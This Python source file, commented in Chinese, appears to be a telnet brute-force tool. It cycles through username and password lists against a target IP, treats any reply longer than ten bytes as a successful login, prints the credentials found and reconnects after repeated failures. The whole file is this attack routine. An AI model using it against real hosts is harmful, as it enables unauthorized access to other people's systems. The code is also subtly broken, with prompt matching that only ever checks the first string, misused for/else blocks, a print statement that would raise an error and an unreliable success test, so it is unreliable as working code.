import telnetlib
import time
from colorama import Fore,Style,init

# 此拓展将在python3.13后废用，建议用python3.11或以下版本运行。


def telnet_login(users, passwords, ip, port=23):
    num=0
    init()
    
    try:
            tel_con = telnetlib.Telnet(ip, port, timeout=3)
    except Exception as e:
            print(f"连接失败：{e}")
            return False

    for user in users:
        for password in passwords:
            if num<3:
                #判断是否连接大于三次
                try:
                    tel_con.read_until(b"login: " or b"admin: " or b"username: " or "用户:")
                    tel_con.write(user.encode('ascii') + b"\n")
                            # 填写数据
                        #读取数据包返回password or 密码
                    tel_con.read_until(b"Password:" or b"password:" or "密码: ")
                    tel_con.write(password.encode('ascii') + b"\n")
                            #填写数据
                    time.sleep(1)
                        #接受回复
                    tel_response = tel_con.read_very_eager()
                        # 如果返回数据大于10则判断为登录成功
                    if len(tel_response)>10:
                        print(Fore.GREEN+f"登陆成功:{user},{password}"+Style.RESET_ALL)
                        print(tel_response)
                        tel_con.close()#连接关闭
                        return True
                    else:
                        print(Fore.RED+f"登陆失败:{user},{password}"+Style.RESET_ALL)
                        num=num+1

                except Exception as e:
                    print(Fore.YELLOW+f"登陆失败：{e}"+Style.RESET_ALL)
        else:
                try:
                    tel_con = telnetlib.Telnet(ip, port, timeout=3)
                except Exception as e:
                    print(Fore.YELLOW+f"连接失败：{e}"+Style.RESET_ALL)
                    return False
                num=0
    else:          
            
        try:
            tel_con = telnetlib.Telnet(ip, port, timeout=3)
        except Exception as e:
            print(Fore.YELLOW+f"连接失败：{e}"+Style.RESET_ALL)
            return False
        if num<3:
            for user in users:
                for password in passwords:
                    try:
                        tel_con.read_until(b"login: " or b"admin: " or b"username: ")
                        tel_con.write(user.encode('ascii') + b"\n")

                        tel_con.read_until(b"Password:" or b"password:" or b"password")
                        tel_con.write(password.encode('ascii') + b"\n")

                        time.sleep(1)

                        tel_response = tel_con.read_very_eager()
                            
                        if len(tel_response)>10:
                            print(Fore.GREEN+f"登陆成功: {user},{password}"+Style.RESET_ALL)
                            print(tel_response+Style)
                            num=num+1
                                
                        else:
                            print(Fore.RED+f"登陆失败: {user},{password}"+Style.RESET_ALL)
                            num=num+1
                    except Exception as e:
                        print(Fore.YELLOW+f"登陆失败：{e}"+Style.RESET_ALL)
        else:
                try:
                    tel_con = telnetlib.Telnet(ip, port, timeout=3)
                except Exception as e:
                    print(Fore.YELLOW+f"连接失败：{e}"+Style.RESET_ALL)
                
                    return False
                    
                num=0
      
